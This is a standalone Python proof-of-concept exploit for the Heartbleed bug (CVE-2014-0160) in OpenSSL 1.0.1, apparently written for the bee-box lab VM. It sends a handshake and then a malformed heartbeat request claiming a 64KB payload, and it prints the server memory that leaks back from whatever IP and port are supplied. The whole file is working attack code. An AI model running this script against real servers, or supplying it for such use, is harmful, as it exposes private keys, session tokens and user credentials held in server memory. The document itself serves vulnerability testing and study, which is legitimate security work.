#!/usr/bin/python

# CVE: CVE-2014-0160 (https://www.cve.org/CVERecord?id=CVE-2014-0160/)
# Author: werebug (https://werebug.com)
# Tested on: bee-box from Vulnhub (https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/)
# Software: OpenSSL 1.0.1 before 1.0.1g

import argparse
import array
import select
import socket
import struct
import time


HANDSHAKE_RECORD = 0x16
CLIENT_HELLO = 0x01
SERVER_HELLO = 0x02
SERVER_CERTIFICATE = 0x0b
SERVER_KEY_EXCHANGE = 0x0c
SERVER_DONE = 0x0e
SERVER_ALERT = 0x21
HEARTBEAT_MESSAGE = 0x18
HEARTBEAT_REQUEST = 0x01
HEARTBEAT_RESPONSE = 0x02

TLS_VERSIONS = {
  1.0: (0x03, 0x01),
  1.1: (0x03, 0x02),
  1.2: (0x03, 0x03)
}

CLIENT_HELLO_PACKET = [
  HANDSHAKE_RECORD, # Type: Handshake record
  0x03, 0x03,       # TLS Version: Version 1.2
  0x00, 0x2f,       # Packet Length: 47 bytes
  CLIENT_HELLO,     # Message Type: Client hello
  0x00, 0x00, 0x2b, # Message length: 43 bytes
  0x03, 0x03,       # Client TLS Version: Client supports version 1.2
                    # Random (nonce)
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
  0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
  0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
  0x00,             # Session ID Length
  0x00, 0x02,       # Cipher Suite Length: 2 bytes
  0x00, 0x2f,       # Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA
  0x01, 0x00,       # Compression: length 0x01 byte & 0x00 (no compression)
  0x00, 0x00        # Extension Length: 0, no extension
]

HEARTBEAT_PACKET = [
  HEARTBEAT_MESSAGE, # Type: Heartbeat Message
  0x03, 0x03,        # TLS Version: 1.2
  0x00, 0x03,        # Packet length: 3 bytes
  HEARTBEAT_REQUEST, # Heartbeat type: request
  0x40, 0x00         # Payload length: 64KB
]

receive_timeout_sec = 5


def receive_bytes(socket, byte_count):
  timeout_time = time.time() + 5
  response = b''
  remaining_bytes_count = byte_count
  while remaining_bytes_count > 0:
    if time.time() > timeout_time:
      break
    readable, writable, error = select.select([socket], [], [], 1)
    if socket in readable:
      data = socket.recv(remaining_bytes_count)
      response += data
      remaining_bytes_count -= len(data)
  return response
  
  
def read_server_packet(socket):
  header_length = 5
  header = receive_bytes(socket, header_length)
  if header != b'':
    ssl_type, version, length = struct.unpack('>BHH', header)
    print('Type: %02x; Version: %04x, Length: %d' 
          % (ssl_type, version, length))
    if length > 0:
      payload = receive_bytes(socket, length)
    return ssl_type, version, length, payload
  else:
    print('Response had no headers')
    return None, None, None, None
  
  
def read_server_heartbeat(socket):
  ssl_type, version, length, payload = read_server_packet(socket)
  if ssl_type != HEARTBEAT_MESSAGE or payload[0] != HEARTBEAT_RESPONSE:
    print('Server didn\'t reply with heartbeat.')
    return None, None, None, None
  return ssl_type, version, length, payload


def patch_tls_version(tls_version):
  patch = TLS_VERSIONS[tls_version]
  CLIENT_HELLO_PACKET[1:3] = patch
  CLIENT_HELLO_PACKET[9:11] = patch
  HEARTBEAT_PACKET[1:3] = patch
  return
  
  
def main():
  args_parser = argparse.ArgumentParser()
  args_parser.add_argument(
      '-s', metavar='IP', required=True, type=str, help='Target server.')
  args_parser.add_argument(
      '-p', metavar='PORT', type=int, default=8080, help='Port.')
  args_parser.add_argument(
      '-t', metavar='VERSION', type=float, default=1.2, choices=(1.0, 1.1, 1.2), help='TLS version.')
  args = args_parser.parse_args()
  
  target = args.s
  port = args.p
  tls_version = args.t

  patch_tls_version(tls_version)

  with socket.create_connection((target, port)) as client_socket:
    client_socket.send(array.array('B', CLIENT_HELLO_PACKET))
    server_done_received = False
    while not server_done_received:
      _, _, _, payload = read_server_packet(client_socket)
      if payload[0] == SERVER_DONE:
        server_done_received = True
    client_socket.send(array.array('B', HEARTBEAT_PACKET))
    print('Malicious Heartbeat sent.')
    _, _, _, payload = read_server_heartbeat(client_socket)
    if payload:
      print(payload)
    else:
      print('Something went wrong.')


if __name__ == '__main__':
  main()